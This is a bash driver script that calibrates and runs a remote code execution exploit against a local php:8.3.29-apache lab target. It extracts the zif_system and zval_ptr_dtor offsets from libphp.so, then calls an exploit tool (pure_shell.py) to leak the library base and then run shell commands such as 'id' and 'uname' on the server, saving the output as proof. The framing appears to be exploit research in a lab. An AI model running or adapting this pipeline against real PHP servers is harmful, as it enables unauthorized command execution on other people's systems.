#!/bin/bash
# calibrate.sh — end-to-end calibration pass for php:8.3.29-apache.
#
#   1. extract libphp.so and read zif_system / zval_ptr_dtor
#   2. start the lab target (single-worker prefork, stock php.ini-production)
#   3. leak-only run  -> libphp base + main chunk candidate
#   4. exec proof     -> id + uname, written to ./out
#
# usage: ./calibrate.sh
set -eu
HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
LIB=${LIB:-$HERE/libphp.so}
PORT=${PORT:-18129}
LOG=${LOG:-$HERE/evidence/calibrate-8329.log}

mkdir -p "$HERE/evidence"

echo "[1/4] offsets"
OUT=$("$HERE/offsets.sh" "$LIB" 2>/dev/null || "$HERE/offsets.sh")
echo "$OUT"
ZIF=$(printf '%s\n' "$OUT" | awk '$1=="zif_system"{print $2}')
DTOR=$(printf '%s\n' "$OUT" | awk '$1=="zval_ptr_dtor"{print $2}')
if [ -z "$ZIF" ] || [ -z "$DTOR" ]; then
  echo "failed to resolve offsets" >&2
  exit 1
fi
echo "      zif=$ZIF dtor=$DTOR"

echo "[2/4] target"
"$HERE/run.sh"

echo "[3/4] leak-only"
python3 "$HERE/../oneshot/pure_shell.py" \
  --host 127.0.0.1 --port "$PORT" --path /index.php \
  --outdir "$HERE/out" --zif "$ZIF" --dtor "$DTOR" \
  --leak --no-banner --log "$LOG" 2>&1 | tee -a "$LOG" || true

echo "[4/4] exec proof"
python3 "$HERE/../oneshot/pure_shell.py" \
  --host 127.0.0.1 --port "$PORT" --path /index.php \
  --outdir "$HERE/out" --zif "$ZIF" --dtor "$DTOR" \
  --exec 'id; uname -sr; php -v | head -1' \
  --no-banner --log "$LOG" 2>&1 | tee -a "$LOG" || true

echo "--- out/ ---"
ls -la "$HERE/out" | tail -5
echo "--- new proof files ---"
for f in "$HERE"/out/o*; do
  [ -f "$f" ] && { echo "== $f"; cat "$f"; }
done
